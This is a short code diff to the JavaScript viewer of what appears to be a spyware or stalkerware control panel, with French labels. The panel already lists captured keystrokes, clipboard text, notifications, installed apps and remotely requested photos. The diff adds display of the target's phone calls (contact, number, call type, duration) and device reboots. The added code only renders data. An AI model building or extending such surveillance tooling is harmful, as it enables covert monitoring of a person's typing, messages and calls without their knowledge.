@@ -122,6 +122,8 @@ const TYPE_LABELS={
   notification_message:'💬 Notification',
   keystroke:'⌨️ Texte tapé',
   clipboard:'📋 Presse-papiers',
+  phone_call:'📞 Appel',
+  device_boot:'🔄 Redémarrage',
 };
 
 const SOURCE_LABELS={auto:'Auto-capturée',command:'Demandée',gallery:'Galerie'};
@@ -157,6 +159,15 @@ function eventDetail(e){
   if(e.type==='app_focus')return`📱 ${esc(p.app||'')}`;
   // Android : apps installées
   if(e.type==='apps_installed')return`${p.count||0} apps installées`;
+  // Appels téléphoniques
+  if(e.type==='phone_call'){
+    const typeIcons={entrant:'📲',sortant:'📱',manque:'❌',rejete:'🚫'};
+    const icon=typeIcons[p.type]||'📞';
+    const dur=p.durationMinutes>0?` (${p.durationMinutes} min)`:(p.durationSeconds>0?` (${p.durationSeconds}s)`:'');
+    const name=p.contact?`<strong>${esc(p.contact)}</strong> — `:'';
+    return`${icon} ${esc(p.type||'')} — ${name}${esc(p.number||'inconnu')}${dur}`;
+  }
+  if(e.type==='device_boot')return'Appareil redémarre';
   // Clipboard
   if(e.type==='clipboard')return`📋 <em>"${esc((p.text||'').slice(0,200))}"</em> (${p.length||0} car.)`;
   // Photo
